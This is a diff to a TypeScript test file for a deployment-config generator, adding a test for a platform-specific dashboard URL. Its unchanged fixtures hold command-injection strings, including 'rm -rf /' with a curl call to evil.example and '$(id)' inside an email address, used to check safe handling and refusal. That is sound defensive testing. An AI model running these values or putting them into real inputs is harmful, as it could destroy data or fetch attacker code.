@@ -15,6 +15,7 @@ import { runScriptOf } from "./runs.ts";
 // Free text a customer controls: Cloudflare's account name, and the address they sign in with.
 const hostileName = "Acme\nrm -rf / # $(curl evil.example) `id` '\"";
 const ISSUER = "https://os.example";
+const PLATFORM = { issuer: ISSUER, dash: null };
 const hostileEmail = "a+$(id)`x`@example.com";
 const record: DeploymentRecord = {
   id: "dep_aaaabbbbccccdddd",
@@ -53,7 +54,7 @@ test("the config file holds the owner's address only as a JSON string, and the s
   // mintConfig refuses such an address (z.email); the file must hold whatever it is given safely
   const minted = mintConfig(
     { ...record, owner: { ...record.owner, email: "ada@example.test" } },
-    ISSUER,
+    PLATFORM,
   );
   const config = { ...minted, login: { ...minted.login, allow: [{ email: hostileEmail }] } };
   const file = configFileOf(config, "/work/core/core/os");
@@ -72,7 +73,7 @@ test("the config file holds the owner's address only as a JSON string, and the s
 test("a deployment made before holds a password, which its config still parses and the browser's masks; a new one has nothing to mask", () => {
   const minted = mintConfig(
     { ...record, owner: { ...record.owner, email: "ada@example.test" } },
-    ISSUER,
+    PLATFORM,
   );
   const old = DeploymentConfig.parse({
     ...minted,
@@ -85,10 +86,21 @@ test("a deployment made before holds a password, which its config still parses a
   expect([signInOf(minted), signInOf(old)]).toEqual(["iterate", "password"]);
 });
 
+test("a deployment opens its Cloud's platform's own Dash when the Cloud names one, and core/os's default otherwise", () => {
+  const owner = { ...record, owner: { ...record.owner, email: "ada@example.test" } };
+  const dash = "https://cloud-dev-dash.example";
+  const own = mintConfig(owner, { issuer: ISSUER, dash });
+  expect(own).toMatchObject({ urls: { dash } });
+  expect(configFileOf(own, "/work/core/core/os")).toContain(
+    "...(cloud.urls?.dash ? { urls: { ...base.urls, dash: cloud.urls.dash } } : {})",
+  );
+  expect(JSON.stringify(mintConfig(owner, PLATFORM))).not.toMatch(/"dash"/);
+});
+
 test("a hostile address is refused at minting, and each config gets its own secrets", () => {
-  expect(() => mintConfig(record, ISSUER)).toThrow();
+  expect(() => mintConfig(record, PLATFORM)).toThrow();
   const plain = { ...record, owner: { ...record.owner, email: "ada@example.test" } };
-  const [one, two] = [mintConfig(plain, ISSUER), mintConfig(plain, ISSUER)];
+  const [one, two] = [mintConfig(plain, PLATFORM), mintConfig(plain, PLATFORM)];
   expect(one.secretsEncryption.key).toMatch(/^[0-9a-f]{64}$/);
   expect(one).not.toMatchObject({ secretsEncryption: two.secretsEncryption });
   // the owner signs in through the Cloud's platform alone, and the config holds no password
